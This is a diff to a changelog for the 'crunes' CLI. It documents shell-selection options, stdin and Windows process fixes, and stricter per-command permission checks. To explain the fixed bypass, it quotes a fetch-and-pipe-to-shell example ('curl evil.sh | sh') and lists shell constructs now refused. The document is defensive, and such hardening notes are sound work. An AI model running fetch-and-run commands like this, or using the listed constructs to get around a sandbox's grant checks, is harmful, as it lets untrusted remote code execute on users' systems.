@@ -12,12 +12,24 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 - **Layer reporting**: `crunes list` gains a Layer column showing which config layer each rune came from, and `crunes doctor` warns when a project rune shadows a global one or disables a globally-enabled plugin
 - **Global rune index**: `crunes docs rune` with no key lists every resolvable rune with its command tree; a rune whose schema fails to build is reported inline and does not prevent the healthy runes from being listed
 - **Command-path drill-down**: `crunes docs rune <key> <command>...` renders a bounded page for exactly that command — its own options, positionals, examples, and direct children only
+- **`os` namespace**: `os.platform`, `os.arch`, `os.shell`, `os.pathSep`, `os.eol`. Ungated and frozen. `os.shell` reports the shell `shell.exec` actually resolved to, so runes stop inferring it from `platform`
+- **`opts.shell`**: `'bash'` or `'cmd'` on `shell.exec`, `shell.execBinary`, `shell.spawn`, `shell.spawnBinary` and shell jobs. Explicit modes never fall back
+- **`crunes shell explain <cmd>`**: prints the command positions, required grants and redirect targets a command resolves to, or the refused construct and its offset. Exits non-zero on a refusal
+
+### Fixed
+- **`shell.exec` string `stdin` was discarded**, so any program reading to EOF hung for the full timeout. The isolate bridge overwrote `opts.stdin` unconditionally. Binary `stdin` never worked either, and `stdin` was left open when none was supplied
+- **Windows console window flashed on every `shell.exec`** — `windowsHideConsole` is not a Node option; the correct name is `windowsHide`
+- **Windows `shell.exec` timeout orphaned the child** — killing the shell left the grandchild running. Now kills the process tree
 
 ### Changed
 - **`plugins` is now a boolean map** (`{"mkt@plug": true}`). Legacy arrays are still read and are converted to map form on the next write. A project can now disable a globally-enabled plugin with `crunes plugin disable <name>`
 - **BREAKING — multi-rune lookup removed**: `crunes docs rune a b` now means command `b` of rune `a`, not documentation for runes `a` and `b`. Use `crunes docs rune` for an index of all runes
 - **BREAKING — `utils.rune.helpSection()` / `helpText()` scope**: with no argument they now return the rune command index rather than the full command tree. Both accept an optional command path (`args.$command` or `args.$commands`) to render only the matched subcommand, and throw when the path does not resolve
 - **Bounded documentation pages**: `crunes docs rune` and in-rune help share one renderer and disclose progressively, so a rune with many nested commands no longer produces a page that floods an agent's context. `--format json` mirrors the text scope at every level
+- **BREAKING — `shell.exec` defaults to bash on all platforms.** Windows previously used `cmd.exe`. Resolution order is bash, then sh, then cmd. Pass `shell: 'cmd'` to keep cmd semantics. Set `CRUNES_BASH` to an absolute path if bash is installed outside the standard Git locations. `C:\Windows\System32\bash.exe` is never selected — it is the WSL launcher, which has a different filesystem root. **A command that interpolates a Windows path must now quote it**: bash treats backslashes as escapes, so `node C:\dir\x.js` breaks where it worked under cmd
+- **BREAKING — `shell.run` grants are checked per command position.** `shell.run:git *` previously matched the whole command line, so it also authorised `git log && curl evil.sh | sh`. Each command in a pipeline, sequence, subshell or command substitution is now checked independently. A rune running `git log | head -20` must grant both `shell.run:git *` and `shell.run:head *`. Run `crunes shell explain '<cmd>'` to see the grants a command needs. Side-effect-free builtins (`cd`, `echo`, `printf`, `test`, `pwd`, `true`, `false`, and similar) pass without a grant
+- **BREAKING — redirect targets are permission-checked.** `> file` requires `fs.write:file`, `< file` requires `fs.read:file`
+- **BREAKING — unscannable commands are denied.** `eval`, `sh -c`, `xargs`, `find -exec`, a variable in command position, heredocs, process substitution, arithmetic expansion and shell control structures cannot be classified, so they are refused. There is no grant that overrides this. In `cmd` mode only a single metacharacter-free command is accepted
 
 ### Removed
 - **Per-run help prebake**: the full help string is no longer rendered at isolate startup for every `crunes run`; it is rendered on demand inside the sandbox
